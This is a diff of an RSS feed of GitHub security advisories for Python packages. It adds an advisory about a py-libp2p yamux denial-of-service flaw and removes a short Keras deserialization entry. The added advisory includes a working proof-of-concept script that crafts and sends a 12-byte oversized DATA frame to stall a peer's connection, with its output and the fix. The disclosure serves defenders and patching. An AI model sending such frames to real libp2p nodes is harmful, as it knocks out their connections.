@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-08-13T16:43:07.335Z</updated>
+    <updated>2026-08-13T17:48:13.028Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,248 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[libp2p] libp2p: yamux connection DoS via oversized data frame]]></title>
+        <id>https://github.com/advisories/GHSA-hmj8-5xmh-5573</id>
+        <link href="https://github.com/advisories/GHSA-hmj8-5xmh-5573"/>
+        <updated>2026-08-13T17:43:44.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The yamux stream multiplexer in py-libp2p does not validate incoming DATA frame lengths against the receive window before reading the frame body. Any peer that completes a standard libp2p handshake can send a single 12-byte frame claiming a 4 GB body, causing the victim's yamux read loop to block indefinitely. This affects the default <code>new_host()</code> configuration and requires no special setup on either side.</p>
+<h3 id="details">Details</h3>
+<p>In <code>libp2p/stream_muxer/yamux/yamux.py</code> (lines 915 to 926), the <code>handle_incoming()</code> method dispatches on frame type. When a DATA frame arrives, it reads the body unconditionally:</p>
+<pre><code class="language-python">elif typ == TYPE_DATA:
+    try:
+        data = (
+            await read_exactly(self.secured_conn, length)
+            if length &gt; 0
+            else b""
+        )
+</code></pre>
+<p>The <code>length</code> field is taken directly from the wire-decoded frame header, a 32-bit unsigned integer with a maximum value of 4,294,967,295. There is no check that <code>length</code> fits within the stream's receive window (<code>DEFAULT_WINDOW_SIZE = 256 * 1024</code> bytes). The body read also happens before the code checks whether the referenced <code>stream_id</code> even exists in <code>self.streams</code> (that check is at line 954), so any stream ID triggers the issue.</p>
+<p><code>handle_incoming()</code> itself is a single sequential loop with no timeout around the body read. Once <code>read_exactly</code> suspends waiting for data that never comes, the loop cannot process any subsequent frames. Every stream on that yamux connection stops working, and no exception is raised.</p>
+<p>The same unguarded call appears in the SYN branch at lines 804 to 806, so a crafted SYN frame with a large length field triggers the same stall.</p>
+<p>The yamux specification (section 3.3) explicitly requires the receiver to reset the stream if a sender transmits more data than the receive window allows. py-libp2p does not enforce this on the receiver side. All three comparable implementations do: go-yamux tracks <code>recvWindow</code> per stream and returns a <code>SendWindowExceeded</code> error on violation; rust-yamux validates frame length against the stream credit; js-libp2p yamux checks frame length against <code>maxMessageSize</code>.</p>
+<h3 id="poc">PoC</h3>
+<p>The harness completes a normal noise handshake and yamux negotiation between two local hosts, confirms yamux is healthy with a pre-attack ping, then writes a single malicious frame directly to the attacker's secured connection. After a short pause, it attempts to open a new stream with a 3-second deadline. The stream open never completes.</p>
+<p>File: test_poc.py</p>
+<pre><code class="language-python">"""
+author: @tahaafarooq
+POC: yamux connection DoS via oversized data frame (connection DoS)
+"""
+import os
+import secrets
+import gc
+import struct
+
+import psutil
+import trio
+import multiaddr
+
+from libp2p import new_host
+from libp2p.crypto.ed25519 import create_new_key_pair
+from libp2p.custom_types import TProtocol
+from libp2p.peer.peerinfo import PeerInfo
+from libp2p.stream_muxer.yamux.yamux import Yamux
+
+LOOPBACK = multiaddr.Multiaddr("/ip4/127.0.0.1/tcp/0")
+PING = TProtocol("/audit/ping/1.0.0")
+
+YAMUX_HEADER_FORMAT = "!BBHII"
+TYPE_DATA = 0x0
+HUGE_LENGTH = 0xFFFF_FFFF  # max uint32 — 4,294,967,295 bytes
+
+
+def craft_malicious_frame(stream_id: int = 1) -&gt; bytes:
+    """
+    12-byte yamux DATA frame with flags=0 and length=4 GB.
+    The stream_id is irrelevant: yamux reads the body BEFORE checking
+    whether the stream exists.
+    """
+    return struct.pack(YAMUX_HEADER_FORMAT, 0, TYPE_DATA, 0, stream_id, HUGE_LENGTH)
+
+
+def _get_yamux(host, peer_id) -&gt; Yamux | None:
+    swarm = host.get_network()
+    conns = swarm.connections.get(peer_id)
+    if conns is None:
+        return None
+    conn = conns[0] if isinstance(conns, list) else conns
+    mc = conn.muxed_conn
+    return mc if isinstance(mc, Yamux) else None
+
+
+async def attack():
+    proc = psutil.Process(os.getpid())
+    rss0 = proc.memory_info().rss
+
+    v_kp = create_new_key_pair(secrets.token_bytes(32))
+    a_kp = create_new_key_pair(secrets.token_bytes(32))
+
+    # DEFAULT new_host() — noise + yamux — no explicit sec_opt or muxer_opt
+    victim = new_host(key_pair=v_kp)
+    attacker = new_host(key_pair=a_kp)
+
+    victim.set_stream_handler(PING, lambda s: s.close())
+
+    async with victim.run(listen_addrs=[LOOPBACK]):
+        vaddr = victim.get_addrs()[0]
+        assert "127.0.0.1" in str(vaddr), "SAFETY: non-loopback"
+        print(f"[*] Victim   : {vaddr}")
+        print(f"[*] Config   : DEFAULT (noise + yamux)")
+
+        async with attacker.run(listen_addrs=[LOOPBACK]):
+            await attacker.connect(PeerInfo(victim.get_id(), victim.get_addrs()))
+            await trio.sleep(0.2)
+
+            a_yamux = _get_yamux(attacker, victim.get_id())
+            v_yamux = _get_yamux(victim, attacker.get_id())
+            assert a_yamux and v_yamux, "yamux muxed_conn not found"
+            print(
+                f"[*] Muxer    : attacker={type(a_yamux).__name__}, "
+                f"victim={type(v_yamux).__name__}"
+            )
+
+            # --- Pre-attack: confirm yamux is healthy ---
+            pre_stream = await attacker.new_stream(victim.get_id(), [PING])
+            await pre_stream.close()
+            print("[*] Pre-attack ping: OK (yamux live)")
+
+            # --- Inject malicious frame ---
+            frame = craft_malicious_frame(stream_id=1)
+            print(
+                f"[*] Injecting {len(frame)}-byte yamux frame: "
+                f"type=DATA flags=0x0 stream_id=1 length={HUGE_LENGTH:#010x} "
+                f"({HUGE_LENGTH:,} bytes)"
+            )
+            print(f"[*] Frame hex: {frame.hex()}")
+
+            # Write directly to the noise-encrypted secure conn.
+            # secured_conn.write() encrypts before sending; victim decrypts and
+            # sees the raw yamux frame bytes, which handle_incoming processes.
+            await a_yamux.secured_conn.write(frame)
+            await trio.sleep(0.2)
+            # Victim's handle_incoming has now read the 12-byte header, dispatched
+            # to `elif typ == TYPE_DATA:`, and entered read_exactly(conn, 4GB).
+
+            # --- Post-attack: try to use yamux ---
+            post_attack_succeeded = False
+
+            with trio.move_on_after(3.0):
+                try:
+                    post_stream = await attacker.new_stream(victim.get_id(), [PING])
+                    await post_stream.close()
+                    post_attack_succeeded = True
+                except Exception as e:
+                    print(f"[*] Post-attack new_stream error: {type(e).__name__}: {e}")
+
+            gc.collect()
+            rss1 = proc.memory_info().rss
+
+            print("\n=== RESULTS ===")
+            print(f"Injected frame (hex) : {frame.hex()}")
+            print(
+                f"Body-length field    : {HUGE_LENGTH} bytes requested, 0 bytes sent"
+            )
+            print(f"Post-attack ping OK  : {post_attack_succeeded}")
+            print(f"RSS delta            : {(rss1 - rss0) / 1024:.1f} KiB")
+
+            yamux_stuck = not post_attack_succeeded
+            print(f"\nVictim yamux loop stuck: {yamux_stuck}")
+
+            if yamux_stuck:
+                print(
+                    "[CONFIRMED] handle_incoming blocked - victim yamux dead for "
+                    "this connection."
+                )
+                print(
+                    "[IMPACT   ] Single 12-byte write from any authenticated peer "
+                    "(post-noise-handshake)\n"
+                    "            permanently stalls yamux for that connection.\n"
+                    "            Affects DEFAULT new_host() config - no mplex required.\n"
+                    "            No timeout, no max-length check, no exception."
+                )
+            else:
+                print("[NOT CONFIRMED] yamux responded post-attack.")
+
+            assert yamux_stuck, (
+                "Expected yamux to be stuck after injecting malicious DATA frame, "
+                "but connection remained functional."
+            )
+
+
+def test_yamux_data_frame_stall():
+    trio.run(attack)
+
+
+if __name__ == "__main__":
+    trio.run(attack)
+</code></pre>
+<pre><code>python3 -m pytest test_poc.py::test_yamux_data_frame_stall -v
+</code></pre>
+<p>Malicious frame (12 bytes, hex): <code>00000000000000 01ffffffff</code></p>
+<pre><code>version  = 0x00
+type     = 0x00  (DATA)
+flags    = 0x0000
+stream_id= 0x00000001
+length   = 0xFFFFFFFF  (4,294,967,295 bytes)
+</code></pre>
+<p>Output:</p>
+<pre><code>[*] Config   : DEFAULT (noise + yamux)
+[*] Pre-attack ping: OK (yamux live)
+[*] Injecting 12-byte yamux frame: type=DATA flags=0x0 stream_id=1 length=0xffffffff
+Victim yamux loop stuck: True
+[CONFIRMED] handle_incoming blocked - victim yamux dead for this connection.
+PASSED in ~3.8s
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>A single authenticated peer (one that has completed the noise handshake, which requires no credentials) can permanently freeze the yamux read loop for a given connection using 12 bytes of payload. All streams on that connection stop working. No exception is raised, no log entry is written, and no automatic recovery occurs.</p>
+<p>This applies to the default <code>new_host()</code> configuration. Unlike a similar issue in the mplex muxer (which requires an explicit opt-in), every py-libp2p node using the standard setup is affected. At the default connection limit of 10,000 connections, an attacker running 10,000 peers can freeze all connections using roughly 120 KB of total traffic.</p>
+<p>There is no confidentiality or integrity impact. The effect is limited to availability on the targeted yamux connection.</p>
+<h3 id="remediation">Remediation</h3>
+<p><strong>1. Enforce the receive window on inbound DATA frames</strong> (primary fix)
+Before calling <code>read_exactly</code>, reject frames whose declared length exceeds the negotiated receive window:</p>
+<pre><code class="language-python"># libp2p/stream_muxer/yamux/yamux.py
+                                                                                                           
+MAX_YAMUX_FRAME = 256 * 1024  # matches DEFAULT_WINDOW_SIZE and go-yamux default
+                                                     
+elif typ == TYPE_DATA:
+    if length &gt; MAX_YAMUX_FRAME:
+        logger.warning(
+            f"yamux: oversized DATA frame length={length} &gt; {MAX_YAMUX_FRAME}, sending RST"
+        )
+        rst_header = struct.pack(YAMUX_HEADER_FORMAT, 0, TYPE_DATA, FLAG_RST, stream_id, 0)
+        await self.secured_conn.write(rst_header)
+        continue  # skip body read; loop processes next frame
+    data = await read_exactly(self.secured_conn, length) if length &gt; 0 else b""
+</code></pre>
+<p>The same check should be applied to the SYN branch at lines 804 to 806.</p>
+<p><strong>2. Add a per-frame timeout in <code>handle_incoming()</code></strong></p>
+<pre><code class="language-python">while not self.event_shutting_down.is_set():
+    try:
+        with trio.fail_after(60):
+            header = await read_exactly(self.secured_conn, HEADER_SIZE)
+            ...
+    except trio.TooSlowError:
+        logger.warning("yamux: frame read timed out, closing connection")
+        self.event_shutting_down.set()
+        break
+</code></pre>
+<p>Option 1 eliminates the amplification entirely. Option 2 bounds the worst-case stall duration for any future oversized-read path that might be introduced.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/libp2p/py-libp2p/security/advisories/GHSA-hmj8-5xmh-5573">https://github.com/libp2p/py-libp2p/security/advisories/GHSA-hmj8-5xmh-5573</a></li>
+<li><a href="https://github.com/libp2p/py-libp2p/commit/146ea87d1a20cc7dacf684ecf7c204543be04b37">https://github.com/libp2p/py-libp2p/commit/146ea87d1a20cc7dacf684ecf7c204543be04b37</a></li>
+<li><a href="https://github.com/advisories/GHSA-hmj8-5xmh-5573">https://github.com/advisories/GHSA-hmj8-5xmh-5573</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hmj8-5xmh-5573</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-24T22:37:17.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[atomic-agents-stack] atomic-agents-stack: Dashboard HTTP server path traversal allows arbitrary file read]]></title>
         <id>https://github.com/advisories/GHSA-rm43-82j9-r4mj</id>
@@ -966,32 +1208,5 @@ def _check_private_networks(self, ip_addr, hostname):
         </author>
         <category label="severity" term="LOW"/>
         <published>2026-07-14T06:31:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[keras] Keras: Lambda deserialization can bypass safe mode and execute code]]></title>
-        <id>https://github.com/advisories/GHSA-5gwj-m78q-7pq3</id>
-        <link href="https://github.com/advisories/GHSA-5gwj-m78q-7pq3"/>
-        <updated>2026-08-07T20:30:43.000Z</updated>
-        <content type="html"><![CDATA[<p>A vulnerability in keras-team/keras version 3.14.0 allows for arbitrary code execution due to improper handling of deserialization in the <code>Lambda</code> layer. Specifically, the <code>_raise_for_lambda_deserialization()</code> function fails to enforce the safe-mode guard when <code>safe_mode</code> is set to <code>None</code>, which is the default value when <code>from_config()</code> is called outside of a <code>SafeModeScope</code> context. This logic error conflates <code>None</code> (unset/default-deny) with <code>False</code> (explicitly disabled), bypassing the guard and allowing attacker-controlled <code>marshal</code> bytecode to be deserialized. Affected call sites include <code>keras.layers.deserialize(config)</code>, <code>keras.models.clone_model(model)</code>, and any direct invocation of <code>Lambda.from_config(config)</code> without an enclosing <code>SafeModeScope(True)</code>. This vulnerability can be exploited to achieve arbitrary OS-level code execution in the context of the server or user process.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12481">https://nvd.nist.gov/vuln/detail/CVE-2026-12481</a></li>
-<li><a href="https://huntr.com/bounties/59ceaed1-c8a3-4135-8f94-169ade02823d">https://huntr.com/bounties/59ceaed1-c8a3-4135-8f94-169ade02823d</a></li>
-<li><a href="https://github.com/keras-team/keras/pull/23048">https://github.com/keras-team/keras/pull/23048</a></li>
-<li><a href="https://github.com/keras-team/keras/pull/23165">https://github.com/keras-team/keras/pull/23165</a></li>
-<li><a href="https://github.com/keras-team/keras/commit/55888d3becbdbb45dc16a55b489900f911e2dde5">https://github.com/keras-team/keras/commit/55888d3becbdbb45dc16a55b489900f911e2dde5</a></li>
-<li><a href="https://github.com/keras-team/keras/commit/d338a45204bdc787c8b3c4a9b82c1911cd52dedf">https://github.com/keras-team/keras/commit/d338a45204bdc787c8b3c4a9b82c1911cd52dedf</a></li>
-<li><a href="https://github.com/keras-team/keras/releases/tag/v3.12.3">https://github.com/keras-team/keras/releases/tag/v3.12.3</a></li>
-<li><a href="https://github.com/keras-team/keras/releases/tag/v3.15.0">https://github.com/keras-team/keras/releases/tag/v3.15.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-5gwj-m78q-7pq3">https://github.com/advisories/GHSA-5gwj-m78q-7pq3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5gwj-m78q-7pq3</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-03T21:31:36.000Z</published>
     </entry>
 </feed>
